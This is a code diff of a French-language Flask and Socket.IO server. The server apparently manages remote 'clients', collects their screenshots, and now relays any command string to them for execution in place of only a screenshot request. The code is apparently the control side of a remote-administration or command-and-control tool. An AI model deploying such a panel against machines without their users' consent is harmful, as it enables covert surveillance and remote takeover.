@@ -10,7 +10,7 @@ from flask_socketio import SocketIO
 
 from config.config import Config
 from config.extensions import db
-from models import Client, Screenshot
+from models import Client, Command, CommandType
 
 app = Flask(__name__)
 app.config.from_object(Config)
@@ -18,7 +18,7 @@ db.init_app(app)
 migrate = Migrate(app, db)
 jwt = JWTManager(app)
 
-socketio = SocketIO(app)
+socketio = SocketIO(app, max_size=10*1024*1024)
 
 authorizations = {
     'bearer_auth': {
@@ -38,13 +38,15 @@ clients_ns = api.namespace('api/v1/clients', description='Client operations')
 screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
-command_model = api.model('Command', {'command': fields.String(required=True, description='Commande à envoyer')})
+command_model = api.model('Command', {
+    'command': fields.String(required=True, description='Commande à exécuter')
+})
 client_model = api.model('Client', {
     'id': fields.Integer(required=True, description='ID du client'),
     'ip': fields.String(required=True, description='Adresse IP du client'),
-    'os': fields.String(required=True, description='Système d\'exploitation du client'),
-    'os_version': fields.String(required=True, description='Version du système d\'exploitation du client'),
-    'hostname': fields.String(required=True, description='Nom d\'hôte du client'),
+    'os': fields.String(required=False, description='Système d\'exploitation du client'),
+    'os_version': fields.String(required=False, description='Version du système d\'exploitation du client'),
+    'hostname': fields.String(required=False, description='Nom d\'hôte du client'),
     'status': fields.String(required=True, description='Statut du client'),
     'date_created': fields.String(required=True, description='Date de création du client'),
     'date_updated': fields.String(required=True, description='Date de mise à jour du client')
@@ -57,6 +59,7 @@ screenshots_model = api.model('Screenshots', {
 
 client_params = api.parser()
 client_params.add_argument('status', type=str, required=False, help='Filter clients by their status (online/offline).')
+
 
 @auth_ns.route('/')
 class Authenticate(Resource):
@@ -78,17 +81,15 @@ class HandleCommand(Resource):
     def post(self, client_id):
         command_data = request.get_json()
         command = command_data.get('command')
-        if command == 'screenshot':
-            client = Client.query.get(client_id)
-            if client and client.status == 'online':
-                socketio.emit('command', {'command': command}, room=client.sid)
-                return {'status': 'success',
-                        'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
-            elif client and client.status == 'offline':
-                return {'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}, 400
-            else:
-                return {'status': 'error', 'message': 'Client non trouvé.'}, 404
-        return {'status': 'error', 'message': 'Commande non reconnue.'}, 400
+        client = Client.query.get(client_id)
+        if client and client.status == 'online':
+            socketio.emit('command', {'command': command}, room=client.sid)
+            return {'status': 'success',
+                    'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
+        elif client and client.status == 'offline':
+            return {'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}, 400
+        else:
+            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 
 @clients_ns.route('/')
@@ -115,7 +116,7 @@ class GetScreenshotsByClientId(Resource):
     @api.doc(security='bearer_auth')
     @screenshot_ns.marshal_with(screenshots_model, as_list=True)
     def get(self, client_id):
-        screenshots = Screenshot.query.filter_by(client_id=client_id).all()
+        screenshots = Command.query.filter_by(client_id=client_id, type=CommandType.SCREENSHOT).all()
         for screenshot in screenshots:
             screenshot.date_created = screenshot.date_created.strftime('%d/%m/%Y à %H:%M:%S')
         return screenshots, 200
@@ -126,7 +127,7 @@ class GetScreenshotImage(Resource):
     @jwt_required()
     @api.doc(security='bearer_auth')
     def get(self, screenshot_id):
-        screenshot = Screenshot.query.get(screenshot_id)
+        screenshot = Command.query.get(screenshot_id)
         if screenshot and os.path.exists(screenshot.file_path):
             return send_file(screenshot.file_path, mimetype='image/png')
         else:
@@ -172,8 +173,8 @@ def handle_screenshot(data):
         screenshot_path = f"{screenshot_dir}/{file_name}"
         with open(screenshot_path, 'wb') as f:
             f.write(screenshot_bytes)
-        new_screenshot = Screenshot(client_id=client.id, file_path=screenshot_path)
-        db.session.add(new_screenshot)
+        new_command = Command(type=CommandType.SCREENSHOT, client_id=client.id, file_path=screenshot_path)
+        db.session.add(new_command)
         db.session.commit()
 
 
